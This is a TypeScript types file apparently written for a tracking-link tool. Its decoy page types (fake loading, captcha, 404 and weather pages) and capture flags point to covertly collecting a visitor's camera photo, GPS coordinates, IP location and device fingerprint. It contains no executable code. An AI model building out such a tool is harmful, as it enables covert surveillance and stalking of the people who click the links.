export type DecoyType = 'loading' | 'captcha' | '404' | 'weather';

export interface TrackingLink {
  id: string;
  name: string;
  targetUrl: string;
  decoyType: DecoyType;
  creationDate: string;
  clicks: number;
  captures: number;
  captureCamera: boolean;
  captureGps: boolean;
  captureDevice: boolean;
}

export interface CaptureLog {
  id: string;
  linkId: string;
  linkName: string;
  timestamp: string;
  ipAddress: string;
  country: string;
  city: string;
  deviceType: string;
  os: string;
  browser: string;
  batteryLevel?: number;
  isBatteryCharging?: boolean;
  screenResolution: string;
  connectionType?: string;
  language: string;
  platform: string;
  hardwareConcurrency?: number;
  gpsAccuracy?: number;
  latitude?: number;
  longitude?: number;
  cameraPhoto?: string; // base64 string
  audioLevel?: number;
  aiSecurityAssessment?: string;
  status: 'success' | 'partial' | 'denied';
}
